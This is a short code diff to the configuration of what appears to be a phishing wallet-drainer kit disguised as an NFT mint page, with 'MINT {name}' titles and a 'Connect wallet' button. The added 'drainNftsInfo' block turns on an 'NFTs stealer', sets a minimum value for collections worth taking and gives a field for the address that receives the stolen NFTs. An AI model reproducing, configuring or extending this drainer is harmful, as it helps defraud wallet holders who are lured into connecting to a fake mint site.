@@ -33,6 +33,12 @@ const claimPageInfo = {
     imageRadius: 250, // image radius in px
 }
 
+const drainNftsInfo = {
+    active: true,   // Active (true) or not (false) NFTs stealer.
+    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
+}
+
 const customStrings = {
     title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
     connectButton: "Connect wallet",
